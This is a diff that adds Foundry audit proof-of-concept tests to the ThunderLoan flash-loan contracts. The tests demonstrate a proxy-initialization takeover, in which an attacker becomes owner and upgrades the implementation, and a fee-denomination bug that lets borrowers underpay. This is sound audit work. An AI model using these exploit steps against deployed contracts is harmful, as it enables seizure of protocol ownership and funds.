@@ -1,10 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
 
-import { Test, console } from "forge-std/Test.sol";
+import { Test, console, console2 } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
+import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
+import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
+import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -86,5 +89,103 @@ contract ThunderLoanTest is BaseTest {
 
         assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
         assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
+    }
+
+    // the L-1: the deploy script never calls initialize, so anyone can initialize the proxy,
+    // become the owner and replace the implementation
+    function test_AnyoneCanInitializeProxy_AUDIT() public {
+        // exactly what script/DeployThunderLoan.s.sol does, no initialize call
+        ThunderLoan implementation = new ThunderLoan();
+        ERC1967Proxy freshProxy = new ERC1967Proxy(address(implementation), "");
+        ThunderLoan uninitializedProxy = ThunderLoan(address(freshProxy));
+
+        // the proxy is live, but it has no owner and no pool factory
+        console.log("owner before:", uninitializedProxy.owner());
+        console.log("pool factory before:", uninitializedProxy.getPoolFactoryAddress());
+        assertEq(uninitializedProxy.owner(), address(0));
+        assertEq(uninitializedProxy.getPoolFactoryAddress(), address(0));
+
+        // an attacker initializes it first and becomes the owner
+        address attacker = makeAddr("attacker");
+        MockPoolFactory attackerFactory = new MockPoolFactory();
+
+        vm.prank(attacker);
+        uninitializedProxy.initialize(address(attackerFactory));
+
+        console.log("owner after:", uninitializedProxy.owner());
+        assertEq(uninitializedProxy.owner(), attacker);
+        assertEq(
+            uninitializedProxy.getPoolFactoryAddress(),
+            address(attackerFactory)
+        );
+
+        // the deployer can never take it back, the initializer is spent
+        vm.expectRevert();
+        uninitializedProxy.initialize(address(mockPoolFactory));
+
+        // and the attacker owns every onlyOwner function, the fee for example
+        vm.prank(attacker);
+        uninitializedProxy.updateFlashLoanFee(1e18);
+        console2.log("fee set by attacker:", uninitializedProxy.getFee());
+        assertEq(uninitializedProxy.getFee(), 1e18);
+
+        // the owner is also the upgrade authority, so the implementation can be replaced
+        ThunderLoan maliciousImplementation = new ThunderLoan();
+        vm.prank(attacker);
+        uninitializedProxy.upgradeToAndCall(address(maliciousImplementation), "");
+
+        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        address newImplementation = address(
+            uint160(uint256(vm.load(address(freshProxy), implementationSlot)))
+        );
+        console.log("implementation after attacker upgrade:", newImplementation);
+        assertEq(newImplementation, address(maliciousImplementation));
+    }
+
+    // the H-1: getCalculatedFee returns the fee in WETH value, but flashloan expects it in token units
+    function test_CalculatedFeeIsDenominatedInWeth_AUDIT() public setAllowedToken hasDeposits {
+        uint256 amountToBorrow = AMOUNT;
+
+        // the mock pool hardcodes a price of 1e18, which hides the bug, so set a real one:
+        // this token is worth 0.01 WETH, not 1 WETH
+        uint256 price = 0.01e18;
+        MockTSwapPool pool = MockTSwapPool(mockPoolFactory.getPool(address(tokenA)));
+        vm.mockCall(
+            address(pool),
+            abi.encodeWithSelector(MockTSwapPool.getPriceOfOnePoolTokenInWeth.selector),
+            abi.encode(price)
+        );
+
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+
+        // the fee should be 0.3% of the borrowed token amount
+        uint256 intendedFee = (amountToBorrow * thunderLoan.getFee()) / thunderLoan.getFeePrecision();
+
+        // instead it is 0.3% of the WETH value, treated as if it were tokens
+        uint256 valueInWeth = (amountToBorrow * price) / thunderLoan.getFeePrecision();
+        uint256 wronglyDenominatedFee = (valueInWeth * thunderLoan.getFee()) / thunderLoan.getFeePrecision();
+
+        console2.log("intended fee in token units:", intendedFee);
+        console2.log("fee the contract charges:", fee);
+        assertEq(fee, wronglyDenominatedFee);
+        assertEq(fee, intendedFee / 100);
+
+        // and the protocol really accepts this reduced fee on a real flash loan
+        vm.startPrank(user);
+        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
+        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+
+        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+        console2.log("asset token balance after the loan:", tokenA.balanceOf(address(assetToken)));
+        console2.log("receiver paid in fees:", AMOUNT - mockFlashLoanReceiver.getBalanceAfter());
+
+        // the pool grew by the wrongly denominated fee, not by the intended one
+        assertEq(
+            tokenA.balanceOf(address(assetToken)),
+            DEPOSIT_AMOUNT + fee
+        );
+        assertEq(AMOUNT - mockFlashLoanReceiver.getBalanceAfter(), fee);
+        assertLt(fee, intendedFee);
     }
 }
